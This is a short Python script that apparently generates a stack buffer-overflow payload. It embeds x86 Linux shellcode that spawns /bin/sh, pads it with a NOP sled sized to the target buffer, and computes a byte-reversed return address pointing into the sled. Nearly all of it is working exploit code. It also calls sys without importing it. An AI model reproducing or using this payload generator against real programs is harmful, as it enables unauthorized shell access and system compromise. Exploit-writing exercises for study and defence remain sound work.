import re
def create_list(strng):
    return re.findall('..',strng)

def gen_payload2(len_buffer, vals):
    shell_code = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b"
    if len_buffer < 60:
        print('WARNING:The buffer is not large enough to run a shell')
        sys.exit(0)
    print(vals[5])
    n_noops = '\x90'*(len_buffer-len(shell_code)-4)
    print(len(n_noops) + len(shell_code))
    #se le suma un porcentaje a la direccion para que caiga en los noops
    r_dir = str(hex(int(vals[5],16) + (len(n_noops) - int(len(n_noops) * 0.15))))
    #print(str(r_dir))
    r_dir = r_dir.replace('0x','')
    r_dir = ''.join(create_list(r_dir)[::-1])


    return (len(n_noops), re.findall('..',r_dir))
